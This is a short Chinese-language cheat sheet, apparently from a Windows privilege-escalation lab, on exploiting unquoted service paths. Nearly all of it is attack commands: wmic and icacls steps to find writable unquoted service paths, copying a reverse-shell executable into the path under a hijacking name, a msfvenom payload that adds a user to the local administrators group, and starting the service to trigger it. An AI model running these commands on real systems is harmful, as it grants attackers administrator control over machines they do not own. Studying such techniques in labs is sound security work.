# 当bin目录没有双引号并且包含空格（服务路径）

> **需要可写并且路径不安全审查路径看我能能不能修改**

sc发现bin目录无引号，应该access查询是否可以读写

```python
1. 遍历搜索无引号目录
wmic service get name,displayname,pathname,startmode | findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr / i /v """
2. 审查权限(看能不能写)
icacls "C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe" 
icacls "C:\Program Files\Unquoted Path Service"
审查用户权限
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
3. 覆盖（后门exe可以放在解析路径中的任何一个位置，但是名称要和原来的保持一致）
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
或者生成本地提权脚本
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe 
 并放入服务路径
4. 启动
net start unquotedsvc
```
